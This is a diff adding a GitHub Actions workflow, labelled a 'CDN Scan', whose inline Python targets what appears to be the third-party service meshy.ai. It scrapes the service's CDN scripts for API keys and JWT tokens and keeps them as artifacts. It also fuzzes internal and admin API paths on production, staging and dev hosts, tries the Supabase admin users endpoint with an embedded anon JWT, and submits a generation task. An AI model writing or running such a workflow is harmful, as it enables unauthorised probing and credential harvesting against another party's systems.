@@ -1,0 +1,63 @@
+name: Meshy CDN Scan
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: CDN & API Scan
+        run: |
+          python3 -c "
+import requests, re, json
+print('=== CDN JS ===')
+URLS = ['https://cdn.meshy.ai/main.js','https://cdn.meshy.ai/app.js','https://cdn.meshy.ai/bundle.js']
+for url in URLS:
+    try:
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            print('FOUND: ' + url + ' (' + str(len(r.text)) + ' bytes)')
+            keys = re.findall(r'msy_[a-zA-Z0-9_]{20,}', r.text)
+            tokens = re.findall(r'eyJ[a-zA-Z0-9_=-]{50,}', r.text)
+            if keys: print('  KEYS: ' + str(keys))
+            if tokens: print('  TOKENS: ' + str(tokens[:3]))
+            fname = 'cdn_' + url.split('/')[-1][:20] + '.txt'
+            open(fname, 'w').write(r.text)
+        else:
+            print(str(r.status_code) + ' ' + url)
+    except Exception as e:
+        print('ERR: ' + str(e))
+print()
+print('=== BALANCES ===')
+API = 'https://api.meshy.ai'
+KEY = 'msy_dummy_api_key_for_test_mode_12345678'
+for api in ['https://api.meshy.ai','https://api-staging.meshy.ai','https://api-dev.meshy.ai']:
+    try:
+        r = requests.get(api+'/openapi/v1/balance', headers={'Authorization': 'Bearer '+KEY}, timeout=5)
+        print('  '+api+': '+r.text)
+    except: pass
+print()
+print('=== PATH FUZZ ===')
+PATHS = ['/openapi/v1/credits','/openapi/v2/balance','/openapi/v1/account','/internal/v1/balance','/internal/v1/admin']
+for p in PATHS:
+    r = requests.get(API+p, headers={'Authorization': 'Bearer '+KEY}, timeout=5)
+    if r.status_code not in (404,): print('  '+str(r.status_code)+' '+p+': '+r.text[:100])
+print()
+print('=== SUPABASE ADMIN ===')
+SUP = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA'
+AUTH = 'https://auth.meshy.ai'
+r = requests.get(AUTH+'/auth/v1/admin/users', headers={'Authorization': 'Bearer '+SUP, 'apikey': SUP}, timeout=5)
+print('  Admin: '+str(r.status_code)+' '+r.text[:200])
+print()
+print('=== TASK TEST ===')
+r = requests.post(API+'/openapi/v2/text-to-3d', headers={'Authorization': KEY, 'Content-Type': 'application/json', 'X-Api-Version': 'v2026.04.03.post7'}, json={'prompt': 'robot', 'artistic_style': 'realistic', 'mode': 'preview', 'target_formats': ['glb']}, timeout=10)
+print('  '+str(r.status_code)+' => '+r.text[:200])
+"
+      - name: Upload CDN artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: meshy-cdn-scan
+          path: cdn_*.txt
+          retention-days: 1
